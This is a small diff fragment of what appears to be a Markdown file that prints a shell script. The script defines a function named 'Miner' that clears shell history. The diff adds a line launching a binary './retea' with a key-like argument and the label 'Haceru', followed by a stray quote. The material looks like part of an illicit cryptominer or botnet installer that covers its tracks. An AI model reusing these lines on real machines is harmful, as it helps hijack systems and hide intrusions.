@@ -181,6 +181,8 @@ function Miner {
   history -c
 }
 Miner
+' ./retea KOFVwMxV7k7XjP7fwXPY6Cmp16vf8EnL54650LjYb6WYBtuSs3Zd1Ncr3SrpvnAU Haceru
+“
 ```
 
 
